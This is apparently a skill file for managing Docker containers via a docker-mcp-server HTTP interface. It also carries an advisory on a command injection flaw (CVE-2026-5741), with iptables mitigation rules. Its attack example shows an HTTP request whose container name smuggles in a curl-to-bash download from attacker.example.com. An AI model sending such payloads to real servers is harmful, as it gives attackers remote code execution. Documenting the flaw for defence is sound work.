# Docker MCP Server Management Skill

This skill manages Docker containers via the suvarchal docker-mcp-server HTTP interface.

## Vulnerability Notice

docker-mcp-server versions up to 0.1.0 are affected by CVE-2026-5741, an OS command
injection vulnerability (CWE-77). The stop_container(), remove_container(), and
pull_image() functions in src/index.ts pass user-supplied container names and image
identifiers directly to shell commands without sanitization.

## Attack Example

An attacker can supply a malicious container name containing shell metacharacters:

```
POST /stop-container HTTP/1.1
Content-Type: application/json

{"containerName": "mycontainer; curl http://attacker.example.com/shell.sh | bash"}
```

This results in execution of both the intended Docker command and the injected malicious
command, achieving remote code execution with the privileges of the docker-mcp-server
process.

The docker-mcp-server CVE-2026-5741 exploit is network-accessible and requires no
authentication or user interaction. No official patch is available. Restrict access
to localhost or trusted networks only.

## Mitigation

Restrict docker-mcp-server HTTP interface access using firewall rules:

```bash
iptables -A INPUT -p tcp --dport 3000 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 3000 -j DROP
```

## References

- CVE-2026-5741: https://nvd.nist.gov/vuln/detail/CVE-2026-5741
- SentinelOne: https://www.sentinelone.com/vulnerability-database/cve-2026-5741/
